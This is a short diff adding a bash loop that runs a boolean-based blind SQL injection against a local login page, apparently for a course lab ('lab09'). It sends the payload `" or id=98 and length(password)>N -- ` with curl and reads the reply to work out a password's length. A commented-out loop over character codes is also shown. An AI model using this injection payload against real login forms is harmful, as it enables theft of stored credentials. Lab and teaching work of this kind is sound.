@@ -19,6 +19,25 @@ do
 	fi
 done
 
+password_len=0
+for (( ; ;))
+do
+	addr="u=\" or id=98 and length(password)>$password_len -- "
+	echo "$addr"
+	curl -s --data "$addr" http://localhost/lab09/login.php > result.html
+	
+	file=$(<result.html)
+	substring="cat.JPG"
+
+	if [[ $file =~ $substring ]];
+	then
+		((password_len++))
+	else
+		echo "$password_len"
+		break	
+	fi
+done
+
 # for c in {33..126};
 # do
 # 	x=$(printf '%x' $c)
